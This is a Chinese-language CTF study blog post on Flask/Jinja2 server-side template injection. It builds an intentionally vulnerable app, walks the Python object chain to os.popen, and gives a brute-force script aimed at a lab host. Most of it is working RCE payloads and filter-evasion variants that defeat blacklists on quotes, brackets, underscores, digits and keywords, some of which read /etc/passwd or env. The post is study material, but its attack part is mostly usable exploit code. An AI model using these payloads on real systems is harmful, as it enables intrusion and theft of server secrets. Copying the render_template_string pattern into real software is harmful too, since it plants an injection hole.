---
title: "SSTI"
date: "2026-03-09"
lastmod: "2026-08-15T00:00:00+08:00"
slug: "SSTI"
summary: ""
tags:
  - "Python"
  - "HTML"
params:
  protected: false
  commentId: "SSTI"
  legacyId: "SSTI"
cover: ""
draft: false
---

# SSTI

CTF的魅力就在于此：**规则是用来打破的，限制是用来绕过的**

{% raw %}

# 序

ssti

开始文章：https://tttang.com/archive/1698/#toc_

另外的好文章：https://r4x.top/2025/07/14/ssti1/index.html#%E9%98%B2%E5%BE%A1%E5%88%86%E5%B1%82

## flask搭建：

app.py

```
在 Flask 项目中，app.py 通常是整个应用的核心入口文件。

1.实例化应用：创建 Flask 类的实例，即 app = Flask(__name__)。这是所有后续操作的基础 [1, 2]。
2.配置管理：加载数据库连接字符串、密钥（Secret Key）或调试模式等配置信息 [3]。
3.路由定义（Routes）：建立 URL 路径与 Python 函数之间的映射。通过 @app.route('/') 装饰器告诉程序：当用户访问某个地址时，应该执行哪段逻辑 [2, 4]。
4.组件集成：连接数据库插件（如 Flask-SQLAlchemy）、注册蓝图（Blueprints）以及中间件 [5]。
5.启动服务：在开发环境下，通过 app.run() 启动内置的 Web 服务器 [1, 2]。
```



```python
from flask import Flask
//导入Flask类.用于后面实例化出一个WSGI应用程序.
app = Flask(__name__)
//创建Flask实例,传入的第一个参数为模块或包名.
@app.route('/')
/*使用route（）装饰器告诉Flask什么样的URL能触发我们的函数.route（）装饰器把一个函数绑定到对应的URL上，这里的话就是把helloworld这个函数与这个url绑定*/
def hello_world():  # put application's code here
    return 'Hello World!'

if __name__ == '__main__':
    app.run()
//app.run()函数让应用在本地启动
```

pycharm默认搭建flask项目：

```
一些注解：
在 Python 中，def 是 define（定义）的缩写，它是用来声明一个函数的关键字。



```

模板的诞生：

在给出模板渲染代码之前，我们先在本地构造一个html界面作为模板，位置在`"flaskProject\templates\`，也就是模板渲染代码的相同位置下，有一个名`templates`的文件夹，在里面写入一个html文件，内容如下

严格的：test.html

```html
<html>
  <head>
    <title>SSTI</title>
  </head>
 <body>
      <h3>Hello, {{name}}</h3>
  </body>
</html>
```

这里的话,`{{}}`内是需要渲染的内容，此时我们写我们的模板渲染代码(app.py)，内容如下

更改最初的flask的app.py的内容接入test.py

```python
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/',methods=['GET'])
def hello_world():
    query = request.args.get('name') # GET取参数name的值
    return render_template('test.html', name=query) # 将name的值传入模板,进行渲染

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
  //让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web，同时开启debug，方便调试。
```

随后访问：127.0.0.0:5000

此时/?name={{7*7}}没有诞生49这种结果

## 漏洞成因：

以上两个文件放在一起

```python
from flask import Flask,request,render_template_string
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    name = request.args.get('name')
    template = '''
<html>
  <head>
    <title>SSTI</title>
  </head>
 <body>
      <h3>Hello, %s !</h3>
  </body>
</html>
        '''% (name)
    return render_template_string(template)
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

此时输入语句被解析

```
render_template函数在渲染模板的时候使用了%s来动态的替换字符串，Flask中使用了Jinja2 作为模板渲染引擎，
{{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{{}}包裹的内容进行解析。比如{{7*7}}会被解析成49。
```

```
template 变量会变成 ...<h3>Hello, {{7*7}} !</h3>...。
Jinja2 引擎在渲染时，会执行 {{ }} 里的表达式。
页面最终会显示 Hello, 49 !
```

为什么合并写会触发ssti

```
当我将html文件放在templates文件夹
需要使用这种语句
# app.py 里的逻辑
return render_template('index.html', user_name=name)
这样，输入的 name 被 Flask 严格当作数据（Data）传递给模板。即使 name 的值是 {{7*7}}，Jinja2 引擎在解析 index.html 时，也只会把这串字符当成普通文本渲染出来，而不会去执行它。
```

另外：：

```
即便你把 HTML 分开写了，如果你在 HTML 模板内部使用了 |safe 过滤器，依然会手动关掉保护，产生漏洞：
html
<!-- index.html -->
<!-- 这样写依然危险，因为 safe 告诉 Flask 不要转义，直接执行 -->
<h3>Hello, {{ user_name | safe }} !</h3>
```

## 漏洞利用：

### python的魔术方法和内置类：

```
—class—
__class__用于返回该对象所属的类
示例：

>>> 'abcd'.__class__
<class 'str'>
>>> ().__class__
<class 'tuple'>
—base—
__base__用于获取类的基类（也称父类）
示例：

>>> "".__class__
<class 'str'>
>>> "".__class__.__base__
<class 'object'>
//object为str的基类
—mro—
__mro__返回解析方法调用的顺序。（当调用_mro_[1]或者-1时作用其实等同于_base_）
示例：

>>> "".__class__.__mro__
(<class 'str'>, <class 'object'>)
>>> "".__class__.__mro__[1]
<class 'object'>
>>> "".__class__.__mro__[-1]
<class 'object'>
—subclasses—()
__subclasses__()可以获取类的所有子类
示例

>>> "".__class__.__mro__[-1].__subclasses__()
[<class 'type'>,<class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>...]
```

### 过滤器

文档：https://jinja.palletsprojects.com/en/3.0.x/templates/#filters

```
过滤器通过管道符号（|）与变量连接,并且在括号中可能有可选的参数
可以链接到多个过滤器.一个滤波器的输出将应用于下一个过滤器.
其实就是可以实现一些简单的功能，比如attr()过滤器可以实现代替.，join()可以将字符串进行拼接，reverse可以将字符串反置等等
具体如下所示

length() # 获取一个序列或者字典的长度并将其返回

int()：# 将值转换为int类型；

float()：# 将值转换为float类型；

lower()：# 将字符串转换为小写；

upper()：# 将字符串转换为大写；

reverse()：# 反转字符串；

replace(value,old,new)： # 将value中的old替换为new

list()：# 将变量转换为列表类型；

string()：# 将变量转换成字符串类型；

join()：# 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用

attr(): # 获取对象的属性
```

### 基本语句

#### 拿当前类

```
/?name={{"".__class__}}
或者
/?name={{().__class__}}
本质是构造一个空字符串，然后往下索引
```



#### 拿基类

一个疑问

```
/?name={{"".__class__.__bases__[-1]}
/?name={{"".__class__.__bases__[-1]}}
```

都返回

```
Hello, <class 'object'> !
```

```
在这个只有 1 个元素的元组中：
下标 [0] 是它。
下标 [-1]（最后一个）也是它。
```

```
在 Python 的世界里，object 是万物之源。无论你从什么对象开始追踪，最终都会指向它：
起始对象	.__class__	.__bases__[0]
"" (字符串)	<class 'str'>	<class 'object'>
[] (列表)	<class 'list'>	<class 'object'>
123 (整型)	<class 'int'>	<class 'object'>
为什么要找 object？
在 SSTI 攻击中，找到 object 就像是找到了“控制中心的后门钥匙”。因为 object 类下有一个魔术方法叫做 .__subclasses__()。
```

#### 拿到基类的子类

```
/?name={{"".__class__.__bases__[0].__subclasses__()}}
```

```
利用链
列出所有子类：{{ "".__class__.__bases__[0].__subclasses__() }}。
寻找危险类：在这个巨大的列表里寻找能执行命令的类，比如 os._wrap_close 或 warnings.catch_warnings。
调用方法：通过选定的类进入 __init__.__globals__ 寻找 os 模块，最终执行 os.popen('whoami').read()。
```

找可利用的类，寻找那些有回显的或者可以执行命令的类
大多数利用的是`os._wrap_close`这个类，

我们这里可以用一个简单脚本来寻找它对应的下标

```
import requests

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'}
for i in range(500):
    url = "http://127.0.0.1:5000/?name=\
        {{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"
    res = requests.get(url=url, headers=headers)
    #print(res.text)
    if 'os._wrap_close' in res.text:
        print(i)
```

```
PS C:\Users\lilyzero207> python -u "c:\Users\lilyzero207\Desktop\ssti寻找下标.py"
156
```

所以是156

#### 利用恶意点

```
/?name={{"".__class__.__bases__[0].__subclasses__()[156]}}
```

```
返回Hello, <class 'os._wrap_close'> !
```

接下来就可以利用`os。_wrap_close`，这个类中有`popen`方法，我们去调用它
首先
先调用它的__init__方法进行初始化类

```
/?name={{"".__class__.__bases__[0].__subclasses__()[156].__init__}}
```

```
返回：Hello, <function _wrap_close.__init__ at 0x000001853115AC00> !
```

问题：

```
为什么要调用 __init__


在 Python 中，每个类被定义时，都会关联到它所在模块的“全局变量空间”。
__init__ 是这个类的初始化函数。
通过 __init__，我们可以访问到该函数被定义时所处的环境，即 __globals__。
```

尝试拜访globals

```
/?name={{"".__class__.__bases__[0].__subclasses__()[156].__init__.__globals__}}
```

返回了诸如：

```
Hello, {'__name__': 'os', '__doc__': "OS routines for NT or Posix depending on what system we're on.\n\nThis exports:\n - all functions from posix or nt, e.g. unlink, stat, etc.\n - os.path is either posixpath or ntpath\n - os.name is either 'posix' or 'nt'\n - os.curdir is a string representing the current directory (always '.')\n - os.pardir is a string representing the parent directory (always '..')\n - os.sep is the (or a most common) pathname separator ('/' or '\\\\')\n - os.extsep is the extension separator (always '.')\n - os.altsep is the alternate pathname separator (None or '/')\n - os.pathsep is the component separator used in $PATH etc\n - os.linesep is the line separator in text files ('\\r' or '\\n' or '\\r\\n')\n - os.defpath is the default search path for executables\n - os.devnull is the file path of the null device ('/dev/null', etc.)\n\nPrograms that import and use 'os' stand a better chance of being\nportable between different platforms. Of course, they must then\nonly use functions that are defined by all platforms (e.g., unlink\nand opendir), and leave all pathname manipulati
```

```
它会返回一个巨大的字典，
里面包含了 os._wrap_close 这个类在创建时，
它所在的 .py 文件中所有能访问到的变量、函数和导入的模块。
```

字典中得到了：

```
'__builtins__': {'__name__': 'builtins', '__doc__': 
```

```
'popen': <function popen at 0x000001853115AAC0>, '_wrap_close': <class 'os._wrap_close'>, 'fdopen': <function fdopen at 0x000001853115AB60>, '_fspath': <function _fspath at 0x000001853115AFC0>, 'PathLike': <class 'os.PathLike'>, '_AddedDllDirectory': <class 'os._AddedDllDirectory'>, 'add_dll_directory': <function add_dll_directory at 0x000001853115B060>} !
```



#### 利用链

```
在 __globals__ 字典里找到了__popen__  __builtins__模块
调用 popen：__globals__.['popen']('whoami')
读取结果：.read()
最终
/?name={{"".__class__.__bases__[0].__subclasses__()[156].__init__.__globals__['popen']('dir').read()}}
```

```
/name={{"".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('dir').read()}}
```

此时还有：比较厉害的模块，就是`__builtins__`,它里面有`eval()`等函数，我们可以也利用它来进行RCE
它的payload是

```
{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('dir').read()")}}
```

### 实战：labs-1

sstilabs-1

调整了下上面的脚本：

```
#使用 requests.post()。
#将 Payload 放入一个字典中（对应 HTML 表单的 name 属性）。
#通过 data 参数发送。

import requests

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'}
for i in range(500):
    url = "http://node5.anna.nssctf.cn:20360/level/1"
    payload = {
        "code": "{{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"
    }
    
    res = requests.post(url=url, headers=headers, data=payload)
    if 'os._wrap_close' in res.text:
        print(i)
```

找到是：

```
133
```

构造到了这一步

```
code={{"".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__}}
```

得到flag

```
NSSCTF{ace93a23-7b6b-4051-abb3-a2e4157f1597}
```

```
{{"".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}}
```

读到了当前目录

```
{{"".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('dir').read()}}
```

同

```
{{"".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('env').read()}}
```

这样就比较具体的读到了flag

### 绕过

sstilabs全详解

https://sangnigege.github.io/2025/07/13/25SSTI-Lab%E5%85%A8%E8%AF%A6%E8%A7%A3/#%E5%89%8D%E8%A8%80

#### 绕过{{}}   labs-2

详解对于{{}}的绕过：https://blog.csdn.net/weixin_28339967/article/details/158553279

labs-2

利用jinja2的语法，用{%来进行RCE

{% ... %}用来标记语句，比如 if 语句，for 语句等
在里面可以执行print语句

```
{%print("".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('env').read())%}
```

#### 绕过[]   labs-4

labs-4

经常有中括号被ban的情况出现，这个时候可以使用`__getitem__` 魔术方法，它的作用简单说就是可以把中括号转换为括号的形式，

```
{{"".__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(133).__init__.__globals__.__getitem__('popen')('env').read()}}
```

本质就是

```
__bases__[0]  ==  __bases__.__getitem__(0)
```



另外，可使用：

```
{{lipsum.__globals__.os.popen('ls /').read()}}
```

#### 绕过单双引号   labs-5

labs-5

用request模块注入

使用request模块进行绕过，request模块在os._wrap_close中，可使用脚本查询

get方法

```
/?qwq=ls
code={{lipsum.__globals__.os.popen(request.args.qwq).read()}}
```

```
/?nss=ls
code={{url_for.__globals__.os.popen(request.args.nss).read()}}
```

post方法

```
code={{url_for.__globals__.os.popen(request.form.nss).read()}}&nss=env
```

为什么这样做：

```
在 Jinja2 模板中，你可以直接访问 request 对象。
request.args 是 GET 参数字典。
request.args.qwq 会自动获取 URL 中 ?qwq=xxx 的值，且这个值在 URL 里是不需要带引号的字符串。

逻辑：
你在 POST 的 Payload 里写 request.args.os。
你在 URL 后面加 ?os=os&pop=popen&cmd=cat /flag。
Jinja2 执行时，request.args.os 就会变成字符串 "os"
```

知识：

```
args 是 arguments（参数）的缩写。在 HTTP 协议中，它专门指代 URL 参数，也就是我们常说的 Query String（查询字符串）。
```

再提

```
在 Flask 中，POST 参数字典，指的通常是 request.form
```

为什么不同于之前的payload

```
1.前面的{{"".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('env').read()}}
是从""的空字符串开始逐层挖掘

2.这里的url_for和lipsum是Flask/Jinja2框架主动提供的“高权限函数”
url_for 和 lipsum 在被设计出来时，为了完成它们的功能，本身就驻留在核心模块里

   url_for 属于 Flask 核心，它的“朋友圈”（__globals__）里默认就躺着 os 模块或其相关引用。
   lipsum 是 Jinja2 的内置函数，它被定义在 jinja2.utils 模块里，而这个模块为了处理文件路径，开头第一行通常就是 import os
   lipsum`是`jiaja`中的全局函数
```

如果request被ban

利用chr()

```
{% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}

# 等价于

{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

```











#### 绕过args  -request的get模块失效

```
当使用args的方法绕过'和"时，可能遇见args被ban的情况，这个时候可以采用request.cookies和request.values，他们利用的方式大同小异，示例如下

1.在cookie注入
GET:{{url_for.__globals__[request.cookies.a]}}
COOkie: "a" :'__builtins__'
2.在post注入
利用post参数字典request.form
3.在get或者post注入
request.values = request.args (URL 参数) + request.form (POST 表单数据)。
```





#### 绕过下划线_   labs-6

labs-6

1、通过list获取字符列表，然后用pop来获取_,然后使用过滤器(获取符号)

```
{% set a=(()|select|string|list).pop(24)%}{%print(a)%}
```

为什么这样可以构造出_：

```
()|string 的结果是 '()'（没用）。
某些过滤器或类转字符串后会带有下划线。
在你的例子中，(()|select|string) 得到的字符串里，第 24 个字符（下标从 0 开始）正好就是 _。

(()|select|string)：得到一个包含描述文字的字符串
|list：将这个字符串转换成列表   "abc" 变成 ['a', 'b', 'c']
.pop(24)：从列表中取出索引为 24 的那个字符
{% set a = ... %}：将取出的 _ 赋值给变量 a
```

拿到了，然后怎么构造出要的东西

```
比如构造__class__
{% set u = (()|select|string|list).pop(24) %}  
# 假设取出的是 _
{% set class = u ~ u ~ "class" ~ u ~ u %}      
# 拼接成 "__class__"
```

然后利用 `attr()` 过滤器来调用

```
{{ ()|attr(class) }}  
# 等同于 {{ ().__class__ }}

```

构造语句：

```
{% set u = (()|select|string|list).pop(24) %}{% set class = u ~ u ~ "class" ~ u ~ u %}{{ ()|attr(class) }}  
```

```
{% set u = (()|select|string|list).pop(24) %}{% set globals = u ~ u ~ "globals" ~ u ~ u %}{{ lipsum|attr(globals).os.popen('env').read() }}错误！！！
```

出错：

```
这里要加上括号
```

重构：

```
{% set u = (()|select|string|list).pop(24) %}{% set nss = u ~ u ~ "globals" ~ u ~ u %}{{ (lipsum|attr(nss)).os.popen('env').read() }}
```

2.过滤器attr和request注入的联合使用

```
/?nss=__globals__
{{ (lipsum|attr(request.args.nss))['popen']('env').read() }}
```

一定注意(lipsum|attr(request.args.nss))这里俩括号

3.十六进制编码方式*（错误）

```
例子：
{{()["\x5f\x5fclass\x5f\x5f"]}}  等同于 //{{().__class__}}
```

构造：

```
"".__class__=""|attr(__class__)=""|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")
那么这里的话我们就可以把下划线进行十六进制编码绕过
原payload

().__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('cat flag').read()
中括号这里用getitem转换为括号

().__class__.__base__.__subclasses__().__getitem__(133).__init__.__globals__.__getitem__('popen')('cat flag').read()
转换过后的

{{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(133)|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")('popen')('cat flag')|attr("read")()}}
```

#### 绕过点.  labs-7

labs-7

```
1、用[]代替.，举个例子
{{"".__class__}}={{""['__class__']}}
2、用attr()过滤器绕过，举个例子
{{"".__class__}}={{""|attr('__class__')}}
```

exp

```
1.
{{""['__class__']['__bases__'][0]['__subclasses__']()[133]['__init__']['__globals__']['popen']('env')['read']()}}
2.
{{""|attr('__class__')|attr('__bases__')|attr("__getitem__")(0)|attr('__subclasses__')()|attr("__getitem__")(133)|attr('__init__')|attr('__globals__')|attr("__getitem__")("popen")('env')|attr('read')()}}
```

对于payload2的问题：

```
|attr('__bases__')[0]：attr 返回的是一个元组。但在 Jinja2 过滤器链中，你不能直接在过滤器后面加 [0]。你需要用 |attr("__getitem__")(0) 来代替 [0]。
[133] 
索引问题：同理，索引列表也要用 |attr("__getitem__")(133) 或者确保前面的部分被括号正确包裹。
__globals__ 访问：__globals__ 是一个字典。访问字典的 popen 键，标准做法是 |attr("get")("popen") 或者 |attr("__getitem__")("popen")。

```

#### 绕过数字  labs-9

lasbs-9

有时候可能会遇见数字`0-9`被ban的情况，这个时候我们可以通过count来得到数字，举个例子

```
{{(dict(e=a)|join|count)}}        得到1
```

```
dict(e=a)：
在 Python/Jinja2 中，dict() 函数可以创建一个字典。
这里定义了一个键为 e，值为变量 a 的字典。结果是：{'e': a}。
|join：
join 过滤器作用于字典时，默认会提取字典所有的键（Keys）并拼接成字符串。
由于字典里只有一个键 e，所以拼接后的结果就是字符串："e"。
|count（或 |length）：
count 过滤器会计算对象的长度。
字符串 "e" 的长度正好是 1。
```

```
构造 0：{{ ()|count }} (空元组长度为 0)
构造 1：{{ (dict(e=a)|join|count) }}
构造 2：{{ (dict(ee=a)|join|count) }} (键名长度为 2)
```

构造payload

```
原payload
{{"".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}}
新的：
{{"".__class__.__bases__[()|count].__subclasses__()[(dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count)].__init__.__globals__['popen']('ls').read()}}
```

另外，可以使用：

```
{{lipsum.__globals__.os.popen('ls /').read()}}
```

#### 绕过关键字   labs-8

有时候可能遇见`class`、`base`这种关键词被绕过的情况，我们这个时候通常使用的绕过方式是使用join拼接从而实现绕过，举个例子

方法1：

```
{{dict(__in=a,it__=a)|join}} #等同于__init__
```

方法2：利用`+`拼接，可以用`~`拼接，也可以用关键字`reverse`逆转

```
{{lipsum['__glob'+'als__']['o'+'s']['pop'+'en']('ls /').read()}}
{{lipsum['__glob'~'als__']['o'~'s']['pop'~'en']('ls /').read()}}
```

方法3：也可以用关键字`reverse`逆转

```
{{ lipsum['__slabolg__'|reverse]['so'|reverse]['nepop'|reverse]('sl'|reverse)['daer'|reverse]() }}
```

#### get config  labs-10

![img](/assets/img/ssti/96a0a0e61532230df31f27ea06709fc7.png)



```
flask内置函数：
函数 	作用
lipsum 	可加载第三方库
url_for 	可返回url路径
get_flashed_message 	可获取消息
```

```
使用内置函数调用current_app模块进而查看配置文件
current_app可输出当前app(即flask)

所以可以通过内置函数获得current_app进而获得config
```

```
{{url_for.__globals__['current_app'].config}}
或者：
{{get_flashed_messages.__globals__['current_app'].config}}
```

为什么这里{{lipsum.__globals__['current_app'].config}}不行

在 **lipsum** 的全局变量空间（`__globals__`）里，通常**并没有直接存放 current_app 这个对象**

#### 多重过滤1

```
bl['\'', '"', '+', 'request', '.', '[', ']'] 
```

```
过滤了
.
[]
request
'
"
+
```

```
__getitem__构造绕过[]
```

```
join关键字
返回一个字符串，该字符串是序列中字符串的串联。元素之间的分隔符默认为空字符串，可以使用可选参数定义字符串。(ps:如果对象是字典，则只拼接 键 )
```

关键字绕过

过滤器join一般与dict()一起使用，可将字典的键名拼接得到新字符串：

    # 假设关键字class被过滤
    {{ ().__class__}}
     
    # 使用过滤器join和dict()绕过，payload：

拆解：

在执行语句中

设置一个a

a1为__cl

a2为ass__

再利用join拼接

**关于引号的绕过**

```
原理：在 Python/Jinja2 中，dict(key=value) 里的 key 会被自动识别为字符串，而不需要加引号。
过程：
dict(os=a) 会创建一个字典：{'os': a}（这里的 a 是一个未定义的变量，默认为空/Undefined）。
对该字典使用 |join 过滤器。在 Jinja2 中，对字典进行 join 操作会提取所有的 Key 并拼成字符串。
结果：变量 os 的值就变成了字符串 "os"。
```

payload

本质：

```
{{lipsum.__globals__['os'].popen('ls').read()}}
```

所需payload

```
 {% set getitem = dict(__getitem__=1)|join%}
 {%set kg = ({}|select()|string()|attr(getitem)(10))%}
 {% set globals=dict(__globals__=a)|join%}
 {% set os=dict(os=a)|join%}
 {% set payload=(dict(ls=a)|join)|join%}
 {% set popen=dict(popen=a)|join%}
 {% set read=dict(read=a)|join%}  	{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)()}}
```

```
{
1.将getitem变成"__getitem__"
2.构造空格   与第一条并用
3.将globals变成"__globals__"
4.将os变成"__os__"
5.将payload变为ls
6.将popen变成"popen"
7.将read变成"read"
}

{% set getitem = dict(__getitem__=1)|join%}{%print(a)%}{% set globals=dict(__globals__=a)|join%}{% set os=dict(os=a)|join%}{% set one=dict(ls=a)|join%}
{% set popen=dict(popen=a)|join%}{% set read=dict(read=a)|join%}{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(one)|attr(read)()}}
读取到  ls
{% set getitem = dict(__getitem__=1)|join%}{%print(a)%}{% set globals=dict(__globals__=a)|join%}{% set os=dict(os=a)|join%}{% set one=dict(env=a)|join%} {% set popen=dict(popen=a)|join%}{% set read=dict(read=a)|join%}{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(one)|attr(read)()}}
读取到env

```

#### 多重过滤2

```
bl['_', '.', '0-9', '\\', '\'', '"', '[', ']'] 
```

```
过滤了
'
"
_
0-9
.
[ ]
\
空格
```

构造空格和下划线

payload

```
{%set nine = dict(aaaaaaaaa=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set kg=(lipsum|string|list)|attr(pop)(nine)%} //空格
{%set eighteen=nine+nine%}
{%set xhx=(lipsum|string|list)|attr(pop)(eighteen)%} //下划线
{%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join%}{%set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join%}{% set os=dict(os=a)|join%}
{% set popen=dict(popen=a)|join%}
{% set payload=(dict(cat=cat)|join,kg,dict(flag=flag)|join)|join %}
{% set read=dict(read=a)|join%}{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)()}}
```

ll

```
{%set nine = dict(aaaaaaaaa=a)|join|count%}{%set pop=dict(pop=a)|join%}{%set kg=(lipsum|string|list)|attr(pop)(nine)%}{%set eighteen=nine+nine%}{%set xhx=(lipsum|string|list)|attr(pop)(eighteen)%}{%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join%}{%set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join%}{% set os=dict(os=a)|join%}{% set popen=dict(popen=a)|join%}{% set payload=dict(env=a)|join %}{% set read=dict(read=a)|join%}{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)()}}
```

读取到flag

#### 多重过滤3

```
bl['_', '.', '\\', '\'', '"', 'request', '+', 'class', 'init', 'arg', 'config', 'app', 'self', '[', ']'] 
```

过滤了：

```
_
.
\
''       
""       
request
+
class
init
arg
config
app
self
[]
```

关键字用dict和join绕过

```
{%set pop=dict(pop=a)|join%}	//根据pop方法
{%set kg=(lipsum|string|list)|attr(pop)(9)%} //空格
{%set xhx=(lipsum|string|list)|attr(pop)(18)%} //_
{%set one=dict(glo,bals)|join%}
{%set oneth=(xhx,xhx,dict(one=a)|join,xhx,xhx)|join%}
{%set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join%}{% set os=dict(os=a)|join%}
{% set popen=dict(popen=a)|join%}
{% set payload=dict(env=a)|join %}
{% set read=dict(read=a)|join%}{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)()}}
```

```
{{dict(__in=a,it__=a)|join}} #等同于__init__
```

```
{%set nine = dict(aaaaaaaaa=a)|join|count%}{%set pop=dict(pop=a)|join%}{%set kg=(lipsum|string|list)|attr(pop)(nine)%}{%set eighteen= dict(aaaaaaaaaaaaaaaaaa=a)|join|count%}{%set xhx=(lipsum|string|list)|attr(pop)(eighteen)%}{%set globals=(xhx,xhx,dict(glob
als=a)|join,xhx,xhx)|join%}{%set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join%}{% set os=dict(os=a)|join%}{% set popen=dict(popen=a)|join%}{% set payload=dict(env=a)|join %}{% set read=dict(read=a)|join%}{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)()}}
```

这里将十二题的18=9+9用键长度拼出，绕过+

# 知识集

#### 1.关于标签{{}}和{%%}

```
{{ ... }}（表达式标签）：用于打印输出。它的作用是计算括号里的结果，并把它显示在网页上。
类比：Python 里的 print()。


{% ... %}（语句标签）：用于逻辑操作。它负责执行指令（如赋值、循环、判断），但不会在网页上直接显示任何内容。
类比：Python 里的代码行（if, for, x = 1）
```

#### 2.获取符号

```
{% set a=(()|select|string|list).pop(24)%}{%print(a)%}
```

object后为空

```
http://127.0.0.1:5000/?name={% set a=(()|select|string|list).pop(17)%}{%print(a)%}
得到空格
```

#### 3.pop与popen

```
pop (字典/列表的操作)
作用：从一个集合（如字典或列表）中取出并删除一个元素。
在 SSTI 中的角色：它是用来找东西的。比如从 __globals__ 字典里把 os 模块“抠”出来。
类比：你从一个百宝箱（字典）里拿出（pop）了一把扳手。
popen (系统命令执行)
作用：全称 "Pipe Open"，用于打开一个管道执行系统命令。
在 SSTI 中的角色：它是用来搞破坏/拿权限的。它是 os 模块里的方法，负责把字符串变成真正的系统指令（如 ls, whoami）。
类比：你用那把扳手撬开（popen）了服务器的后门。
2. 执行层级的区别
特性	pop	popen
所属模块	Python 内置数据类型 (dict/list)	os 模块
危险程度	中低（主要是泄露信息或破坏变量）	极高（远程代码执行 RCE）
返回值	被弹出的那个对象	一个文件对象（需要 .read() 才能看到内容）
常见用法	dict.pop('key')	os.popen('command')
```

# Fenjing进阶

主要文献参考：https://www.freebuf.com/articles/web/420286.html



## 1.有源码

## 2.无源码



#### 例一：诚实大厅

fuzz出黑名单

然后插入本地的简单flask的漏洞app.py

```
from flask import Flask,request,render_template_string
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    name = request.args.get('name')
    template = '''
<html>
  <head>
    <title>SSTI</title>
  </head>
 <body>
      <h3>Hello, %s !</h3>
  </body>
</html>
        '''% (name)
    return render_template_string(template)
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

插入fuzz得到的黑名单

```
from flask import Flask, request, render_template_string, abort

app = Flask(__name__)

# 定义你的黑名单
blacklist = [
    'request', 'namespace', 'join', 'cycler', 'dict', 'range', 'lipsum',
    'sys', 'subprocess', 'eval', 'exec', 'write', 'input', 'locals',
    '.', 'class', '[', ']', 'import', 'globals', 'builtins', 'config'
]


@app.route('/', methods=['GET', 'POST'])
def index():
    # 获取用户输入
    name = request.args.get('name', '')

    # --- WAF 植入开始 ---
    if name:
        for word in blacklist:
            if word in name.lower():  # 使用 lower() 防止大小写绕过
                return f"<h1>Hacker! 检测到非法字符: {word}</h1>", 403
    # --- WAF 植入结束 ---

    template = '''
<html>
  <head>
    <title>SSTI</title>
  </head>
 <body>
      <h3>Hello, %s !</h3>
  </body>
</html>
    ''' % (name)

    return render_template_string(template)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

fenjing打本地得到可用的ssti链子

```
{{nho|attr('__eq__')|attr('__g''lobals__')|attr('get')('__b''uiltins__')|attr('get')('__i''mport__')('os')|attr('popen')('ls')|attr('read')()}}
```

```
pass,原来他们内心有这么多戏剧
```

但是这里不能直接给flag

python无回显， 

一种可以创建静态目录，再将flag内容写入

```
